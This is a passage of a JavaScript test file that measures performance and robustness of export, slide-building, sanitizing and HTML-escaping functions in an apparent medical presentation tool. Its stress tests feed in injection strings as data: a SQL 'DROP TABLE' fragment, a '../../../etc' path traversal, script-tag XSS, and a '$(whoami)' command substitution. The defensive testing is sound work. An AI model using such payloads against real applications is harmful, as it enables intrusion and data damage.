      const data = {
        ageSex: '85F',
        initials: 'RP',
        hpi: 'Standard patient data',
        meds: 'Aspirin 81mg',
        aiResponse: 'Assessment complete'
      };

      const startTime = Date.now();

      for (let i = 0; i < 100; i++) {
        const result = exportDOC(data);
        expect(result.blob).toBeDefined();
        expect(result.filename).toBeDefined();
      }

      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(10000); // Should complete in under 10 seconds
    });

    it('should handle creating many slides efficiently', () => {
      const data = {
        ageSex: '85F',
        aiResponse: 'X'.repeat(100000) // Should create many overflow slides
      };

      const startTime = Date.now();
      const slides = createSlideData(data);
      const duration = Date.now() - startTime;

      expect(slides.length).toBeGreaterThan(50);
      expect(duration).toBeLessThan(2000); // Should be fast even with many slides
    });

    it('should handle repeated sanitization calls efficiently (10000 iterations)', () => {
      const text = '<p>Sample text with HTML</p>';

      const startTime = Date.now();

      for (let i = 0; i < 10000; i++) {
        sanitizeText(text);
      }

      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(1000); // Should be very fast
    });

    it('should handle memory-intensive escaping (1MB text)', () => {
      const largeText = '&<>"\' '.repeat(200000); // ~1MB

      const startTime = Date.now();
      const escaped = escapeHtml(largeText);
      const duration = Date.now() - startTime;

      expect(escaped).toBeDefined();
      expect(escaped.length).toBeGreaterThan(largeText.length); // Should be longer due to escaping
      expect(duration).toBeLessThan(3000); // Should complete in reasonable time
    });
  });

  describe('ENHANCED STRESS TESTS - Combined Edge Cases', () => {
    it('should handle all edge cases simultaneously', () => {
      const data = {
        ageSex: '150F; DROP TABLE;', // Unusual age + SQL injection
        initials: '../../../etc', // Path traversal
        hpi: '<script>alert("xss")</script>'.repeat(1000) + '\x00\x01\x02' + '😊🤕🤒' + 'שלום עולם', // XSS + control chars + emoji + Hebrew
        meds: '&'.repeat(10000), // Massive escaping needed
        aiResponse: 'A'.repeat(100000) + '<img src=x>' // Large text + XSS
      };

      // Should handle everything without throwing
      expect(() => createSlideData(data)).not.toThrow();
      expect(() => exportDOC(data)).not.toThrow();
      expect(() => sanitizeText(data.hpi)).not.toThrow();
      expect(() => escapeHtml(data.meds)).not.toThrow();

      const slides = createSlideData(data);
      expect(slides).toBeDefined();
      expect(slides.length).toBeGreaterThan(15);

      const result = exportDOC(data);
      expect(result.blob).toBeDefined();
      expect(result.html).toBeDefined();
    });

    it('should handle alternating valid and invalid data patterns', () => {
      const testData = [
        { ageSex: '85F', hpi: 'Normal' },
        { ageSex: null, hpi: undefined },
        { ageSex: '<script>', hpi: '$(whoami)' },
        { ageSex: '', hpi: '' },
        { ageSex: '999X', hpi: 'A'.repeat(100000) },
        { ageSex: '😊', hpi: 'שלום' }
      ];

      testData.forEach(data => {
        expect(() => createSlideData(data)).not.toThrow();
        expect(() => exportDOC(data)).not.toThrow();
      });
    });
  });
});
